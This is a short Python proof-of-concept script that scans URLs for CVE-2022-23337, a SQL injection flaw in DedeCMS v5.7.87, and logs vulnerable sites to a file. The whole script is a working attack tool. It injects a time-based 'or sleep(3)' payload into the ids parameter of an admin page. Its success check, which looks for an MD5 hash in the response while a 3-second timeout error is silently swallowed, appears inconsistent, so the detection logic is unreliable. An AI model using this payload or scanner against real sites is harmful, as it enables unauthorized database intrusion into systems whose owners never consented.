import requests
def dede_sql_poc(url):
    poc = r"""/dede/article_coonepage_rule.php?action=del&ids=2,1)%20or%20sleep(3)%23"""
    url = url + poc
    try:
        res = requests.get(url, timeout=3)
        if "c4ca4238a0b923820dcc509a6f75849b" in res.text:
            print("【！！！！！！】存在CVE_2022_23337漏洞的url:" + url + "\n")
            with open ("存在DedeCMSv5.7.87SQL注入漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
            f.close()
        else:
            print( "【×】不存在CVE_2022_23337漏洞:" + url + "\n")
    except Exception as e:
        pass